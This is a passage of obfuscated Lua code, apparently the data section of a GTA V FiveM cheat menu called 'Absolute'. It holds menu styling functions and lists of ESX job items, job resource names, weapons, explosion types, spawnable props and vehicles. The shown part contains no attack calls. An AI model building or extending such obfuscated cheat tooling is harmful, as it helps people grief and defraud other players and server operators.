            ["a"] = uARhl3hvv0x1 or wWjAS8[f].menuTextColor.a
        }
    )
end
function Absolute.SetMenuSubTextColor(Ann_9LMwR, _ncyR5d6XWc34, DzftQOSs8UY_HAA, i, S07dGVWP)
    EPd4KT2PLr(
        Ann_9LMwR,
        "menuSubTextColor",
        {
            ["r"] = _ncyR5d6XWc34,
            ["g"] = DzftQOSs8UY_HAA,
            ["b"] = i,
            ["a"] = S07dGVWP or wWjAS8[Ann_9LMwR].menuSubTextColor.a
        }
    )
end
function Absolute.SetMenuFocusColor(Iol2sHQkP4, sAB, o4h5b3O, _o3IA5, b)
    EPd4KT2PLr(
        Iol2sHQkP4,
        "menuFocusColor",
        {["r"] = sAB, ["g"] = o4h5b3O, ["b"] = _o3IA5, ["a"] = b or wWjAS8[Iol2sHQkP4].menuFocusColor.a}
    )
end
function Absolute.SetMenuButtonPressedSound(a8KuCfqEgKU4Ejz5EH, K3, t46e)
    EPd4KT2PLr(a8KuCfqEgKU4Ejz5EH, "buttonPressedSound", {["name"] = K3, ["set"] = t46e})
end
function Absolute.SetSubTitle(Ln7LwJ4woFT, d9CahVauorbfsQej)
    EPd4KT2PLr(Ln7LwJ4woFT, "subTitle", d9CahVauorbfsQej)
end
oTable = {}
do
    function oTable.insert(kbbI3sOS, erWJ97Yd1XU, xe8efJaY)
        if not rawget(kbbI3sOS._values, erWJ97Yd1XU) then
            kbbI3sOS._keys[#kbbI3sOS._keys + 1] = erWJ97Yd1XU
        end
        if xe8efJaY == nil then
            oTable.remove(kbbI3sOS, erWJ97Yd1XU)
        else
            kbbI3sOS._values[erWJ97Yd1XU] = xe8efJaY
        end
    end
    local function YIZc6plK0n0uQf3(uHT1200, pYxRmKXCnKzI)
        for I19CNG89FwAf, nZ4dxxsvabUqo_ in ipairs(uHT1200) do
            if nZ4dxxsvabUqo_ == pYxRmKXCnKzI then
                return I19CNG89FwAf
            end
        end
    end
    function oTable.remove(l7Q66z0hx, EG2zlBscwJZmRBTL)
        local MD5s = l7Q66z0hx._values[EG2zlBscwJZmRBTL]
        if MD5s ~= nil then
            table.remove(l7Q66z0hx._keys, YIZc6plK0n0uQf3(l7Q66z0hx._keys, EG2zlBscwJZmRBTL))
            l7Q66z0hx._values[EG2zlBscwJZmRBTL] = nil
        end
        return MD5s
    end
    function oTable.index(QpEGbWUowm, iCJOmkATs4lnL)
        return rawget(QpEGbWUowm._values, iCJOmkATs4lnL)
    end
    function oTable.pairs(EtHPTGTv7Z)
        local W79ZHkfQEE = 0.0
        return function()
            W79ZHkfQEE = W79ZHkfQEE + 1
            local AI2kVA = EtHPTGTv7Z._keys[W79ZHkfQEE]
            if AI2kVA ~= nil then
                return AI2kVA, EtHPTGTv7Z._values[AI2kVA]
            end
        end
    end
    function oTable.new(EYUZ)
        EYUZ = EYUZ or {}
        local okXmP2frdOXC9PoybDsY5 = {_keys = {}, _values = {}}
        local n22g4ML3ANehhnXhNf7df = #EYUZ
        if n22g4ML3ANehhnXhNf7df % 2 ~= 0.0 then
            error "in oTable initialization: key is missing value"
        end
        for i = 1, n22g4ML3ANehhnXhNf7df / 2 do
            local nrYZzvtD_Yz = EYUZ[i * 2 - 1]
            local Khwn = EYUZ[i * 2]
            if okXmP2frdOXC9PoybDsY5._values[nrYZzvtD_Yz] ~= nil then
                error("duplicate key:" .. nrYZzvtD_Yz)
            end
            okXmP2frdOXC9PoybDsY5._keys[#okXmP2frdOXC9PoybDsY5._keys + 1] = nrYZzvtD_Yz
            okXmP2frdOXC9PoybDsY5._values[nrYZzvtD_Yz] = Khwn
        end
        return setmetatable(
            okXmP2frdOXC9PoybDsY5,
            {__newindex = oTable.insert, __len = function(LwhYOll)
                    return #LwhYOll._keys
                end, __pairs = oTable.pairs, __index = okXmP2frdOXC9PoybDsY5._values}
        )
    end
end
Jobs = {
    "Unemployed",
    "Mechanic",
    "Police",
    "Ambulance",
    "Taxi",
    "Real Estate Agent",
    "Car Dealer",
    "Banker",
    "Gang",
    "Mafia"
}
Jobs.Item = {"Butcher", "Tailor", "Miner", "Fueler", "Lumberjack", "Fisher", "Hunting", "Weed", "Meth", "Coke", "Opium"}
Jobs.ItemDatabase = {
    ["Butcher"] = oTable.new {
        "Alive Chicken",
        "alive_chicken",
        "Slaughtered Chicken",
        "slaughtered_chicken",
        "Packaged Chicken",
        "packaged_chicken"
    },
    ["Tailor"] = oTable.new {"Wool", "wool", "Fabric", "fabric", "Clothes", "clothe"},
    ["Fueler"] = oTable.new {"Petrol", "petrol", "Refined Petrol", "petrol_raffin", "Essence", "essence"},
    ["Miner"] = oTable.new {"Stone", "stone", "Washed Stone", "washed_stone", "Diamond", "diamond"},
    ["Lumberjack"] = oTable.new {"Wood", "wood", "Cutted Wood", "cutted_wood", "Packed Plank", "packaged_plank"},
    ["Fisher"] = oTable.new {"Fish", "fish"},
    ["Hunting"] = oTable.new {"Meat", "meat"},
    ["Coke"] = oTable.new {"Coke", "coke", "Coke Bag", "coke_pooch"},
    ["Weed"] = oTable.new {"Weed", "weed", "Weed Bag", "weed_pooch"},
    ["Meth"] = oTable.new {"Meth", "meth", "Meth Bag", "meth_pooch"},
    ["Opium"] = oTable.new {"Opium", "opium", "Opium Bag", "opium_pooch"}
}
Jobs.ItemRequires = {
    ["Fabric"] = "Wool",
    ["Clothes"] = "Fabric",
    ["Washed Stone"] = "Stone",
    ["Diamond"] = "Washed Stone",
    ["Coke Bag"] = "coke",
    ["Weed Bag"] = "weed",
    ["Meth Bag"] = "meth",
    ["Opium Bag"] = "opium"
}
Jobs.Money = {
    "Fuel Delivery",
    "Car Thief",
    "DMV School",
    "Dirty Job",
    "Pizza Boy",
    "Ranger Job",
    "Garbage Job",
    "Car Thief",
    "Trucker Job",
    "Postal Job",
    "Banker Job"
}
Jobs.Money.Value = {
    "esx_fueldelivery",
    "esx_carthief",
    "esx_dmvschool",
    "esx_godirtyjob",
    "esx_pizza",
    "esx_ranger",
    "esx_garbagejob",
    "esx_carthief",
    "esx_truckerjob",
    "esx_gopostaljob",
    "esx_banksecurity"
}
CustomItems = {}
PlayersActives = {}
CustomItems.Item = {"Repair Kit", "Bandage", "Medkit", "Bitcoin", "Gold", "Jewels", "Drill", "Lockpick"}
CustomItems.ItemDatabase = {
    ["Repair Kit"] = oTable.new {"Repair Kit", "fixkit"},
    ["Bandage"] = oTable.new {"Bandage", "bandage"},
    ["Medkit"] = oTable.new {"Medkit", "medikit"},
    ["Bitcoin"] = oTable.new {"Bitcoin", "bitcoin"},
    ["Gold"] = oTable.new {"Gold", "gold"},
    ["Jewels"] = oTable.new {"Jewels", "jewels"},
    ["Drill"] = oTable.new {"Drill", "drill"},
    ["Lockpick"] = oTable.new {"Lockpick", "lockpick"}
}
CustomItems.ItemRequires = {
    ["Repair Kit"] = "fixkit",
    ["Bandage"] = "bandage",
    ["Medkit"] = "medikit",
    ["Bitcoin"] = "bitcoin",
    ["Gold"] = "gold",
    ["Jewels"] = "jewels",
    ["Drill"] = "drill",
    ["Lockpick"] = "lockpick"
}
local Oe17bVy = {"Flare", "FireWork", "Smoke", "Laser", "RPG", "PIPE BOMB", "RAILGUN", "TANK"}
local Hm_I = {
    "WEAPON_FLAREGUN",
    "WEAPON_FIREWORK",
    "WEAPON_SMOKEGRENADE",
    "VEHICLE_WEAPON_PLAYER_LASER",
    "WEAPON_RPG",
    "WEAPON_PIPEBOMB",
    "WEAPON_RAILGUN",
    "VEHICLE_WEAPON_TANK"
}
local a8aX3wrmESORgMKw = {
    "Missile launcher",
    "Mega Magnet",
    "Boat",
    "Roller car",
    "Electric Box small",
    "Ramp small",
    "Ramp medium",
    "Ramp big",
    "Big electrical box",
    "Bottle"
}
local uH21lOeB7WrqG = {
    "hei_prop_carrier_defense_01",
    "hei_prop_heist_magnet",
    "hei_prop_heist_tug",
    "ind_prop_dlc_roller_car",
    "lts_prop_lts_elecbox_24b",
    "lts_prop_lts_ramp_01",
    "lts_prop_lts_ramp_02",
    "lts_prop_lts_ramp_03",
    "lts_prop_lts_elecbox_24",
    "xs_prop_plastic_bottle_wl"
}
local QNsCYSWHSfkijzfnn = {}
local nFLSW = {
    "Grenade",
    "Grenade launcher",
    "Sticky bomb",
    "Molotov",
    "Missile",
    "Tank",
    "Octane",
    "Car",
    "Plane",
    "Petrol pump",
    "Bike",
    "Dir_STEAM",
    "Dir_FLAME",
    "Water Hydrant",
    "DIR GAS CAN",
    "BOAT",
    "Ship",
    "Truck",
    "Bullet",
    "Smoke launcher",
    "Smoke grenade",
    "BZGas",
    "Flare",
    "Gas canister",
    "extinguisher",
    "programmablear",
    "Train",
    "barrel",
    "Propane",
    "Blimp",
    "DIR_FLAME_EXPLODE ",
    "tanker",
    "Plane Missile",
    "Vehicle bullet",
    "Gas tank",
    "proxmibe",
    "Valkyre"
}
local um0O9rU8QscJILqSCYO2X = {
    0.0,
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16,
    17,
    18,
    19,
    20,
    21,
    22,
    23,
    24,
    25,
    26,
    27,
    28,
    29,
    30,
    31,
    32,
    33,
    34,
    0.0,
    34
}
local wJtR = {
    0.0,
    15,
    30,
    45,
    60,
    75,
    90,
    105,
    120,
    135,
    150,
    165,
    180,
    195,
    210,
    225,
    240,
    255,
    270,
    285,
    300,
    315,
    330,
    345,
    360
}
local Mlf_aylZ60ZaoIHuj = {
    5,
    10,
    15,
    20,
    25,
    30,
    35,
    40,
    45,
    50,
    55,
    60,
    65,
    70,
    75,
    80,
    85,
    90,
    95,
    100,
    105,
    110,
    115,
    120,
    125,
    130,
    135,
    140,
    145,
    150,
    155,
    160,
    165,
    170,
    175,
    180,
    185,
    190,
    195,
    200,
    205,
    215,
    220,
    225,
    230,
    235,
    240,
    245,
    250
}
local GaZt7SCmwTVhb5pMuuI = {
    5,
    10,
    15,
    20,
    25,
    30,
    35,
    40,
    45,
    50,
    55,
    60,
    65,
    70,
    75,
    80,
    85,
    90,
    95,
    100,
    105,
    110,
    115,
    120,
    125,
    130,
    135,
    140,
    145,
    150
}
local H = {
    "Canada",
    "Europe",
    "France (baguette)",
    "Germany",
    "Ireland",
    "Japan",
    "Los Santos",
    "L.S.F.D",
    "Los Santos Services",
    "Mexico",
    "Russia",
    "S.A",
    "S.A.P.D",
    "ScotLand",
    "Sheriff",
    "United Kingdom",
    "United States",
    "Golf"
}
local nrZOlvFbKEc = {
    "prop_flag_canada",
    "prop_flag_eu",
    "prop_flag_france",
    "prop_flag_german",
    "prop_flag_ireland",
    "prop_flag_japan",
    "prop_flag_ls",
    "prop_flag_lsfd",
    "prop_flag_lsservices",
    "prop_flag_mexico",
    "prop_flag_russia",
    "prop_flag_sa",
    "prop_flag_sapd",
    "prop_flag_scotland",
    "prop_flag_sheriff",
    "prop_flag_uk",
    "prop_flag_us",
    "prop_golfflag"
}
local z0qe6BmtTrktvUWixnIC = {
    "Missile launcher",
    "Mega Magnet",
    "Boat",
    "Roller car",
    "Electric Box small",
    "Ramp small",
    "Ramp medium",
    "Ramp big",
    "Big electrical box",
    "Bottle"
}
local h = {
    "hei_prop_carrier_defense_01",
    "hei_prop_heist_magnet",
    "hei_prop_heist_tug",
    "ind_prop_dlc_roller_car",
    "lts_prop_lts_elecbox_24b",
    "lts_prop_lts_ramp_01",
    "lts_prop_lts_ramp_02",
    "lts_prop_lts_ramp_03",
    "lts_prop_lts_elecbox_24",
    "xs_prop_plastic_bottle_wl"
}
local xG1La0kfcp = {
    "Dinghy",
    "Dinghy2",
    "Dinghy3",
    "Dingh4",
    "Jetmax",
    "Marquis",
    "Seashark",
    "Seashark2",
    "Seashark3",
    "Speeder",
    "Speeder2",
    "Squalo",
    "Submersible",
    "Submersible2",
    "Suntrap",
    "Toro",
    "Toro2",
    "Tropic",
    "Tropic2",
    "Tug"
}
local LOq7 = {
    "Benson",
    "Biff",
    "Cerberus",
    "Cerberus2",
    "Cerberus3",
    "Hauler",
    "Hauler2",
    "Mule",
    "Mule2",
    "Mule3",
    "Mule4",
    "Packer",
    "Phantom",
    "Phantom2",
    "Phantom3",
    "Pounder",
    "Pounder2",
    "Stockade",
    "Stockade3",
    "Terbyte"
}
local YsewkigrD = {
    "Blista",
    "Blista2",
    "Blista3",
    "Brioso",
    "Dilettante",
    "Dilettante2",
    "Issi2",
    "Issi3",
    "issi4",
    "Iss5",
    "issi6",
    "Panto",
    "Prarire",
    "Rhapsody"
}
local sLNZ6eh4Xs4Fzq = {
    "CogCabrio",
    "Exemplar",
    "F620",
    "Felon",
    "Felon2",
    "Jackal",
    "Oracle",
    "Oracle2",
    "Sentinel",
    "Sentinel2",
    "Windsor",
    "Windsor2",
    "Zion",
    "Zion2"
}
local AHr = {"Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"}
local dIcavAbE = {
    "ambulance",
    "FBI",
    "FBI2",
    "FireTruk",
    "PBus",
    "police",
    "Police2",
    "Police3",
    "Police4",
    "PoliceOld1",
    "PoliceOld2",
    "PoliceT",
    "Policeb",
    "Polmav",
    "Pranger",
    "Predator",
    "Riot",
    "Riot2",
    "Sheriff",
    "Sheriff2"
}
local jDn1upChOtrKMAX = {
    "Akula",
    "Annihilator",
    "Buzzard",
    "Buzzard2",
    "Cargobob",
    "Cargobob2",
    "Cargobob3",
    "Cargobob4",
    "Frogger",
    "Frogger2",
    "Havok",
    "Hunter",
    "Maverick",
    "Savage",
    "Seasparrow",
    "Skylift",
    "Supervolito",
    "Supervolito2",
    "Swift",
    "Swift2",
    "Valkyrie",
    "Valkyrie2",
    "Volatus"
}
local S45ciENRAGDIBfQ9tkrj = {
    "Bulldozer",
    "Cutter",
    "Dump",
    "Flatbed",
    "Guardian",
    "Handler",
    "Mixer",
    "Mixer2",
    "Rubble",
    "Tiptruck",
    "Tiptruck2"
}
local Z27SrxCMQw = {
    "APC",
    "Barracks",
    "Barracks2",
    "Barracks3",
    "Barrage",
    "Chernobog",
    "Crusader",
    "Halftrack",
    "Khanjali",
    "Rhino",
    "Scarab",
    "Scarab2",
    "Scarab3",
    "Thruster",
    "Trailersmall2"
}
local W9t1PS = {
    "Akuma",
    "Avarus",
    "Bagger",
    "Bati2",
    "Bati",
    "BF400",
    "Blazer4",
    "CarbonRS",
    "Chimera",
    "Cliffhanger",
    "Daemon",
    "Daemon2",
    "Defiler",
    "Deathbike",
    "Deathbike2",
    "Deathbike3",
    "Diablous",
    "Diablous2",
    "Double",
    "Enduro",
    "esskey",
    "Faggio2",
    "Faggio3",
    "Faggio",
    "Fcr2",
    "fcr",
    "gargoyle",
    "hakuchou2",
    "hakuchou",
    "hexer",
    "innovation",
    "Lectro",
    "Manchez",
    "Nemesis",
    "Nightblade",
    "Oppressor",
    "Oppressor2",
    "PCJ",
    "Ratbike",
    "Ruffian",
    "Sanchez2",
    "Sanchez",
    "Sanctus",
    "Shotaro",
    "Sovereign",
    "Thrust",
    "Vader",
    "Vindicator",
    "Vortex",
    "Wolfsbane",
    "zombiea",
    "zombieb"
}
local J0Tj48kOxWWJAH = {
    "Blade",
    "Buccaneer",
    "Buccaneer2",
    "Chino",
    "Chino2",
    "clique",
    "Deviant",
    "Dominator",
    "Dominator2",
    "Dominator3",
    "Dominator4",
    "Dominator5",
    "Dominator6",
    "Dukes",
    "Dukes2",
    "Ellie",
    "Faction",
    "faction2",
    "faction3",
    "Gauntlet",
    "Gauntlet2",
    "Hermes",
    "Hotknife",
    "Hustler",
    "Impaler",
    "Impaler2",
    "Impaler3",
    "Impaler4",
    "Imperator",
    "Imperator2",
    "Imperator3",
    "Lurcher",
    "Moonbeam",
    "Moonbeam2",
    "Nightshade",
    "Phoenix",
    "Picador",
    "RatLoader",
    "RatLoader2",
    "Ruiner",
    "Ruiner2",
    "Ruiner3",
    "SabreGT",
    "SabreGT2",
    "Sadler2",
    "Slamvan",
    "Slamvan2",
    "Slamvan3",
    "Slamvan4",
    "Slamvan5",
    "Slamvan6",
    "Stalion",
    "Stalion2",
    "Tampa",
    "Tampa3",
    "Tulip",
    "Vamos,",
    "Vigero",
    "Virgo",
    "Virgo2",
    "Virgo3",
    "Voodoo",
    "Voodoo2",
    "Yosemite"
}
local QG = {
    "BFinjection",
    "Bifta",
    "Blazer",
    "Blazer2",
    "Blazer3",
    "Blazer5",
    "Bohdi",
    "Brawler",
    "Bruiser",
    "Bruiser2",
    "Bruiser3",
    "Caracara",
    "DLoader",
    "Dune",
    "Dune2",
    "Dune3",
    "Dune4",
    "Dune5",
    "Insurgent",
    "Insurgent2",
    "Insurgent3",
    "Kalahari",
    "Kamacho",
    "LGuard",
    "Marshall",
    "Mesa",
    "Mesa2",
    "Mesa3",
    "Monster",
    "Monster4",
    "Monster5",
    "Nightshark",
    "RancherXL",
    "RancherXL2",
    "Rebel",
    "Rebel2",
    "RCBandito",
    "Riata",
    "Sandking",
    "Sandking2",
    "Technical",
    "Technical2",
    "Technical3",
    "TrophyTruck",
    "TrophyTruck2",
    "Freecrawler",
    "Menacer"
}
local LOCvW0tlowOLxCWPboe9s = {
    "AlphaZ1",
    "Avenger",
    "Avenger2",
    "Besra",
    "Blimp",
    "blimp2",
    "Blimp3",
    "Bombushka",
    "Cargoplane",
    "Cuban800",
    "Dodo",
    "Duster",
    "Howard",
    "Hydra",
    "Jet",
    "Lazer",
    "Luxor",
    "Luxor2",
    "Mammatus",
    "Microlight",
    "Miljet",
    "Mogul",
    "Molotok",
    "Nimbus",
    "Nokota",
    "Pyro",
    "Rogue",
    "Seabreeze",
    "Shamal",
    "Starling",
    "Stunt",
    "Titan",
    "Tula",
    "Velum",
    "Velum2",
    "Vestra",
    "Volatol",
    "Striekforce"
}
local X55A1 = {
    "BJXL",
    "Baller",
    "Baller2",
    "Baller3",
    "Baller4",
    "Baller5",
    "Baller6",
    "Cavalcade",
    "Cavalcade2",
    "Dubsta",
    "Dubsta2",
    "Dubsta3",
    "FQ2",
    "Granger",
    "Gresley",
    "Habanero",
    "Huntley",
    "Landstalker",
    "patriot",
    "Patriot2",
    "Radi",
    "Rocoto",
    "Seminole",
    "Serrano",
    "Toros",
    "XLS",
    "XLS2"
}
local XMLuyD_AoHSLlDpGEf = {
    "Asea",
    "Asea2",
    "Asterope",
    "Cog55",
    "Cogg552",
    "Cognoscenti",
    "Cognoscenti2",
    "emperor",
    "emperor2",
    "emperor3",
    "Fugitive",
    "Glendale",
    "ingot",
    "intruder",
    "limo2",
    "premier",
    "primo",
    "primo2",
    "regina",
    "romero",
    "stafford",
    "Stanier",
    "stratum",
    "stretch",
    "surge",
    "tailgater",
    "warrener",
    "Washington"
}
local z9ougpFwMxRLAQnsGdM = {
    "Airbus",
    "Brickade",
    "Bus",
    "Coach",
    "Rallytruck",
    "Rentalbus",
    "taxi",
    "Tourbus",
    "Trash",
    "Trash2",
    "WastIndr",
    "PBus2"
}
local irnutWUqq = {
    "Alpha",
    "Banshee",
    "Banshee2",
    "BestiaGTS",
    "Buffalo",
    "Buffalo2",
    "Buffalo3",
    "Carbonizzare",
    "Comet2",
    "Comet3",
    "Comet4",
    "Comet5",
    "Coquette",
    "Deveste",
    "Elegy",
    "Elegy2",
    "Feltzer2",
    "Feltzer3",
    "FlashGT",
    "Furoregt",
    "Fusilade",
    "Futo",
    "GB200",
    "Hotring",
    "Infernus2",
    "Italigto",
    "Jester",
    "Jester2",
    "Khamelion",
    "Kurama",
    "Kurama2",
    "Lynx",
    "MAssacro",
    "MAssacro2",
    "neon",
    "Ninef",
    "ninfe2",
    "omnis",
    "Pariah",
    "Penumbra",
    "Raiden",
    "RapidGT",
    "RapidGT2",
    "Raptor",
    "Revolter",
    "Ruston",
    "Schafter2",
    "Schafter3",
    "Schafter4",
    "Schafter5",
    "Schafter6",
    "Schlagen",
    "Schwarzer",
    "Sentinel3",
    "Seven70",
    "Specter",
    "Specter2",
    "Streiter",
    "Sultan",
    "Surano",
    "Tampa2",
    "Tropos",
    "Verlierer2",
    "ZR380",
    "ZR3802",
    "ZR3803"
}
local mkYHQQXCwIq0aNIGiva = {
    "Ardent",
    "BType",
    "BType2",
    "BType3",
    "Casco",
    "Cheetah2",
    "Cheburek",
    "Coquette2",
    "Coquette3",
    "Deluxo",
    "Fagaloa",
    "Gt500",
    "JB700",
    "JEster3",
    "MAmba",
    "Manana",
    "Michelli",
    "Monroe",
    "Peyote",
    "Pigalle",
    "RapidGT3",
    "Retinue",
    "Savastra",
    "Stinger",
    "Stingergt",
    "Stromberg",
    "Swinger",
    "Torero",
    "Tornado",
    "Tornado2",
    "Tornado3",
    "Tornado4",
    "Tornado5",
    "Tornado6",
    "Viseris",
    "Z190",
    "ZType"
}
local UmVD = {
    "Adder",
    "Autarch",
    "Bullet",
    "Cheetah",
    "Cyclone",
    "EntityXF",
    "Entity2",
    "FMJ",
    "GP1",
    "Infernus",
    "LE7B",
    "Nero",
    "Nero2",
    "Osiris",
    "Penetrator",
    "PFister811",
    "Prototipo",
    "Reaper",
    "SC1",
    "Scramjet",
    "Sheava",
    "SultanRS",
    "Superd",
    "T20",
    "Taipan",
    "Tempesta",
    "Tezeract",
    "Turismo2",
    "Turismor",
    "Tyrant",
    "Tyrus",
    "Vacca",
    "Vagner",
    "Vigilante",
    "Visione",
    "Voltic",
    "Voltic2",
    "Zentorno",
    "Italigtb",
    "Italigtb2",
    "XA21"
}
local p53VJr7QtJFZSo = {
    "ArmyTanker",
    "ArmyTrailer",
    "ArmyTrailer2",
    "BaleTrailer",
    "BoatTrailer",
    "CableCar",
    "DockTrailer",
    "Graintrailer",
    "Proptrailer",
    "Raketailer",
    "TR2",
    "TR3",
    "TR4",
    "TRFlat",
    "TVTrailer",
    "Tanker",
    "Tanker2",
    "Trailerlogs",
    "Trailersmall",
    "Trailers",
    "Trailers2",
    "Trailers3"
}
local l2iSnV = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
local vXfmtxnDfXi8FI = {
    "Airtug",
    "Caddy",
    "Caddy2",
    "Caddy3",
    "Docktug",
    "Forklift",
    "Mower",
    "Ripley",
    "Sadler",
    "Scrap",
    "TowTruck",
    "Towtruck2",
    "Tractor",
    "Tractor2",
    "Tractor3",
    "TrailerLArge2",
    "Utilitruck",
    "Utilitruck3",
    "Utilitruck2"
}
local c5wo = {
    "Bison",
    "Bison2",
    "Bison3",
    "BobcatXL",
    "Boxville",
    "Boxville2",
    "Boxville3",
    "Boxville4",
    "Boxville5",
    "Burrito",
    "Burrito2",
    "Burrito3",
    "Burrito4",
    "Burrito5",
    "Camper",
    "GBurrito",
    "GBurrito2",
    "Journey",
    "Minivan",
    "Minivan2",
    "Paradise",
    "pony",
    "Pony2",
    "Rumpo",
    "Rumpo2",
    "Rumpo3",
    "Speedo",
    "Speedo2",
    "Speedo4",
    "Surfer",
    "Surfer2",
    "Taco",
    "Youga",
    "youga2"
}
local ufpQmB0016hq0 = {
    "Boats",
    "Commercial",
    "Compacts",
    "Coupes",
    "Cycles",
    "Emergency",
    "Helictopers",
    "Industrial",
    "Military",
    "Motorcycles",
    "Muscle",
    "Off-Road",
    "Planes",
    "SUVs",
    "Sedans",
    "Service",
    "Sports",
    "Sports Classic",
    "Super",
    "Trailer",
    "Trains",
    "Utility",
    "Vans"
}
local HYeXGA = {
    xG1La0kfcp,
    LOq7,
    YsewkigrD,
    sLNZ6eh4Xs4Fzq,
    AHr,
    dIcavAbE,
    jDn1upChOtrKMAX,
    S45ciENRAGDIBfQ9tkrj,
    Z27SrxCMQw,
    W9t1PS,
    J0Tj48kOxWWJAH,
    QG,
    LOCvW0tlowOLxCWPboe9s,
    X55A1,
    XMLuyD_AoHSLlDpGEf,
    z9ougpFwMxRLAQnsGdM,
    irnutWUqq,
    mkYHQQXCwIq0aNIGiva,
    UmVD,
    p53VJr7QtJFZSo,
    l2iSnV,
    vXfmtxnDfXi8FI,
    c5wo
}
local L3zTwwqBQlWWF = {
    "WEAPON_KNIFE",
    "WEAPON_KNUCKLE",
    "WEAPON_NIGHTSTICK",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_BOTTLE",
    "WEAPON_DAGGER",
    "WEAPON_HATCHET",
    "WEAPON_MACHETE",
    "WEAPON_FLASHLIGHT",
    "WEAPON_SWITCHBLADE",
    "WEAPON_PISTOL",
    "WEAPON_PISTOL_MK2",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_SNSPISTOL",
    "WEAPON_HEAVYPISTOL",
    "WEAPON_VINTAGEPISTOL",
    "WEAPON_STUNGUN",
    "WEAPON_FLAREGUN",
    "WEAPON_MARKSMANPISTOL",
    "WEAPON_REVOLVER",
    "WEAPON_MICROSMG",
    "WEAPON_SMG",
    "WEAPON_SMG_MK2",
    "WEAPON_ASSAULTSMG",
    "WEAPON_MG",
    "WEAPON_COMBATMG",
    "WEAPON_COMBATMG_MK2",
    "WEAPON_COMBATPDW",
    "WEAPON_GUSENBERG",
    "WEAPON_MACHINEPISTOL",
    "WEAPON_ASSAULTRIFLE",
    "WEAPON_ASSAULTRIFLE_MK2",
    "WEAPON_CARBINERIFLE",
    "WEAPON_CARBINERIFLE_MK2",
    "WEAPON_ADVANCEDRIFLE",
    "WEAPON_SPECIALCARBINE",
    "WEAPON_BULLPUPRIFLE",
    "WEAPON_COMPACTRIFLE",
    "WEAPON_PUMPSHOTGUN",
    "WEAPON_SAWNOFFSHOTGUN",
    "WEAPON_BULLPUPSHOTGUN",
    "WEAPON_ASSAULTSHOTGUN",
    "WEAPON_MUSKET",
    "WEAPON_HEAVYSHOTGUN",
    "WEAPON_DBSHOTGUN",
    "WEAPON_SNIPERRIFLE",
    "WEAPON_HEAVYSNIPER",
    "WEAPON_HEAVYSNIPER_MK2",
    "WEAPON_MARKSMANRIFLE",
    "WEAPON_GRENADELAUNCHER",
    "WEAPON_GRENADELAUNCHER_SMOKE",
    "WEAPON_RPG",
    "WEAPON_STINGER",
    "WEAPON_FIREWORK",
    "WEAPON_HOMINGLAUNCHER",
    "WEAPON_GRENADE",
    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}
local ntvgfjj9ht7Z = {
    Melee = {
        BaseballBat = {id = "weapon_bat", name = "Baseball Bat", bInfAmmo = false, mods = {}},
        BrokenBottle = {id = "weapon_bottle", name = "Broken Bottle", bInfAmmo = false, mods = {}},
        Crowbar = {id = "weapon_Crowbar", name = "Crowbar", bInfAmmo = false, mods = {}},
        Flashlight = {id = "weapon_flashlight", name = "Flashlight", bInfAmmo = false, mods = {}},
        GolfClub = {id = "weapon_golfclub", name = "Golf Club", bInfAmmo = false, mods = {}},
        BrassKnuckles = {id = "weapon_knuckle", name = "Brass Knuckles", bInfAmmo = false, mods = {}},
        Knife = {id = "weapon_knife", name = "Knife", bInfAmmo = false, mods = {}},
        Machete = {id = "weapon_machete", name = "Machete", bInfAmmo = false, mods = {}},
        Switchblade = {id = "weapon_switchblade", name = "Switchblade", bInfAmmo = false, mods = {}},
        Nightstick = {id = "weapon_nightstick", name = "Nightstick", bInfAmmo = false, mods = {}},
        BattleAxe = {id = "weapon_battleaxe", name = "Battle Axe", bInfAmmo = false, mods = {}}
    },
    Handguns = {
        Pistol = {
            id = "weapon_pistol",
            name = "Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        PistolMK2 = {
            id = "weapon_pistol_mk2",
            name = "Pistol MK 2",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"},
                    {name = "Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"},
                    {name = "Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "Mounted Scope", id = "COMPONENT_AT_PI_RAIL"}},
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH_02"}},
                BarrelAttachments = {
                    {name = "Compensator", id = "COMPONENT_AT_PI_COMP"},
                    {name = "Suppessor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        CombatPistol = {
            id = "weapon_combatpistol",
            name = "Combat Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"},
                    {name = "Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        APPistol = {
            id = "weapon_appistol",
            name = "AP Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
